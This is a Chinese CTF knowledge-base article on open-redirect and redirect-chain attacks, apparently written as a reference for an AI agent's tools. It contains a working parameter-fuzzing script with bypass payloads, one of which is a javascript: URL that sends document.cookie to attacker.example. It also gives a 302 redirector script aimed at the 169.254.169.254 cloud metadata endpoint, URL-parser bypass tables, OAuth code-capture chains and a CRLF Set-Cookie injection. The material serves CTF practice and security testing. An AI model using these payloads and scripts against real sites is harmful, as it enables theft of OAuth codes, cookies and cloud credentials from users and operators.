---
id: "ctf-website/04-ssrf/open-redirect"
title: "Open Redirect & Redirect Chain Attacks"
title_en: "Open Redirect & Redirect Chain Attacks"
summary: >
  开放重定向的实战价值在 URL parser 差分和链式跳转：登录回跳、OAuth redirect_uri、SSRF follow-redirect、cache key、meta refresh 与 JS location 可能采用不同解析规则。本篇给出参数发现、URL 变体矩阵、OAuth code 回收、SSRF 跟随、CRLF/缓存二跳和 Evidence 模板。
summary_en: >
  Open redirect value comes from URL parser differentials and chained redirects across login returns, OAuth redirect_uri, SSRF follow-redirect, cache keys, meta refresh, and JS location. Includes parameter discovery, URL variant matrices, OAuth code capture, SSRF following, CRLF/cache pivots, and evidence templates.
board: "ctf-website"
category: "04-ssrf"
signals: ["open redirect", "开放重定向", "redirect chain", "OAuth redirect", "URL redirection bypass", "parser differential", "302"]
mcp_tools: ["http_probe", "kb_router"]
keywords: ["开放重定向", "open redirect", "OAuth code", "redirect bypass", "URL过滤器绕过", "302重定向链", "Unicode同形字", "CRLF头注入"]
difficulty: "advanced"
tags: ["ssrf", "oauth", "redirect", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/20-oauth-deep/01-oauth-attack-chains", "ctf-website/04-ssrf/ssrf", "ctf-website/03-injection/hpp-crlf"]
---
# Open Redirect & Redirect Chain Attacks

开放重定向不是只看 `Location: https://attacker`。CTF 里更常见的是：白名单解析器通过，浏览器/下游客户端跳到另一处；或者 OAuth、SSRF、缓存、meta refresh 把这个跳转当成信任边界。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| `next/redirect/returnUrl` 等参数 | 参数字典 + 302/HTML/JS location oracle | `Location` 指向 attacker | 只回相对路径 |
| 白名单域校验 | parser 差分矩阵 | 校验通过但浏览器跳外域 | URL parser 严格规范化 |
| OAuth `redirect_uri` | 一次/二次编码、fragment、userinfo | code/token 到 listener | OAuth server 精确匹配 |
| SSRF 客户端 follow redirect | 让 trusted URL 302 到 internal | 下游跟随到内网/metadata | follow redirect 关闭 |
| meta refresh / JS redirect | `javascript:`, `data:`, HTML 注入 | 执行脚本或外带状态 | scheme 白名单 |
| CRLF in redirect | `%0d%0aSet-Cookie` | 新 header/cache 行为 | 换行被编码 |

## 工作流

```text
发现 redirect 参数
  → 建 baseline: 302/Location/HTML/meta/JS
  → URL parser 差分矩阵
  → 根据 sink 选择 OAuth/SSRF/cache/XSS/CRLF 链
  → listener 或业务 oracle 收集成功与失败样本
```

## 0. 参数发现与 URL 矩阵

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
import requests
from urllib.parse import quote

PARAMS = ["redirect","redirect_uri","redirect_url","url","next","return","returnTo","returnUrl","goto","continue","target","dest","destination","callback","back","ref","ru","retUrl"]
URLS = [
    "https://attacker.example/cb",
    "//attacker.example/cb",
    "///attacker.example/cb",
    "https://target.example@attacker.example/cb",
    "https://target.example.attacker.example/cb",
    "https://attacker.example%23.target.example/cb",
    "https://attacker.example%3f.target.example/cb",
    "https:%5c%5cattacker.example%5ccb",
    "/\\attacker.example/cb",
    "javascript:location='https://attacker.example/'+document.cookie",
]

def h(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="endpoint without query")
    ap.add_argument("--host", default="target.example")
    args = ap.parse_args()
    for p in PARAMS:
        for u in URLS:
            payload = u.replace("target.example", args.host)
            r = requests.get(args.url, params={p: payload}, allow_redirects=False, timeout=10)
            print(json.dumps({"param": p, "payload": payload, "status": r.status_code, "location": r.headers.get("Location",""), "hash": h(r.text), "sample": r.text[:120]}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：`Location`、meta refresh、JS location、JSON redirect 字段任一指向 attacker，并能被浏览器或下游客户端执行。失败样本：只反射在页面文本，或被规范化成站内路径。

## 1. Parser 差分矩阵

| 变体 | 绕过点 | 命中样本 |
|---|---|---|
| `target.com@attacker.com` | userinfo vs host | 校验看前缀，浏览器到 attacker |
| `target.com.attacker.com` | suffix/prefix includes | 白名单字符串匹配弱 |
| `//attacker.com` | scheme-relative | 跳外域 |
| `\attacker.com` | 反斜杠规范化差异 | 浏览器/代理解释不同 |
| `%2f%2fattacker.com` | 解码次数差异 | 一层校验一层执行 |
| `attacker.com#target.com` | fragment 不发给服务端 | OAuth/浏览器解析差异 |
| punycode/同形字 | 视觉或 IDNA 差异 | 白名单误判 |

## 2. OAuth code 回收

```text
authorize endpoint
  → redirect_uri 指向目标站内 open redirect
  → 目标站 302 到 listener
  → listener 收到 code/state
  → token endpoint 交换或证明 code 落点
```

Evidence 必须记录：`authorize` URL、目标站 `Location`、listener 收到的 `code/state`、token endpoint 的成功或失败样本。

## 3. SSRF follow redirect

```python
#!/usr/bin/env python3
import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer

class R(BaseHTTPRequestHandler):
    target = "http://169.254.169.254/latest/meta-data/"
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", self.target)
        self.end_headers()
        self.wfile.write(b"redirecting")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=8088)
    ap.add_argument("--target", required=True)
    args = ap.parse_args()
    R.target = args.target
    HTTPServer((args.listen, args.port), R).serve_forever()

if __name__ == "__main__":
    main()
```

把 SSRF 参数指向该 listener，如果服务端 HTTP client 跟随 302，下一跳会访问 `--target`。成功样本是 listener 访问日志加目标侧响应差异；失败样本是只访问第一跳或明确不 follow。

## 4. 链路选择

| Redirect sink | 下一跳 |
|---|---|
| 登录回跳 | session fixation、phishing 页面、token leak |
| OAuth redirect_uri | code/token 回收 |
| SSRF URL | metadata/internal/admin panel |
| cache/CDN | cache poisoning/web cache deception |
| meta refresh/JS | XSS/admin bot |
| CRLF Location | header injection、Set-Cookie/cache |

## 攻击链

```text
Open Redirect
  → URL parser 差分
  → OAuth code / SSRF follow / cache / XSS / CRLF sink
  → listener 或业务 oracle 证明下一跳
```

## Evidence

| 项 | 记录内容 |
|---|---|
| 入口 | 参数名、请求 URL、状态码、Location/meta/JS/JSON 字段 |
| URL 差分 | payload、编码层数、服务端校验结果、浏览器实际目标 |
| 链路 | OAuth/SSRF/cache/XSS/CRLF 的下一跳证据 |
| 成功样本 | listener 收到 code/token/请求，或业务状态/缓存/header 变化 |
| 失败样本 | 规范化站内路径、scheme 拒绝、不 follow redirect、state mismatch |
| 下一跳 | OAuth 转 20-oauth-deep；SSRF 转 ssrf；CRLF 转 hpp-crlf；cache 转 08-infra |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|---|---|---|
| 重定向探测 | `http_probe` | 固定参数字典和 allow_redirects=false |
| 知识路由 | `kb_router` | 按 open redirect、OAuth redirect、SSRF follow 搜索 |
